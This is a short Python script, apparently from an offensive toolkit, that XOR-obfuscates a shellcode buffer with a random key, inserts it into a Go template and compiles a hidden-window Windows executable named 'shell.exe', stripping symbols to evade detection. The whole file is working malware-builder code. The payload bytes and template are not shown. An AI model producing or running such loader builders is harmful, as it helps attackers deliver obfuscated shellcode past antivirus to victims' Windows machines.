import os
import random
import string

def xor(buf,key):
    shellcode = []
    length = len(key)
    for i in range(len(buf)):
        shellcode.append(buf[i]^ord(key[i%length]))
    return shellcode

buf = []

key = "".join(random.sample(string.ascii_lowercase,10))
shellcode = str(xor(buf,key))[1:-1]


with open('template','r') as f:
	code = f.read()

code = code.replace('$shellcode',shellcode+',').replace('$key',key)
with open('main.go','w') as f:
	f.write(code)
os.system('GOOS=windows GOARCH=amd64 go build -ldflags="-s -w -H=windowsgui" -o xor.exe')
os.system('./go-strip -f xor.exe -a -output shell.exe')
os.system("strip shell.exe")
os.remove('main.go')
os.remove('xor.exe')
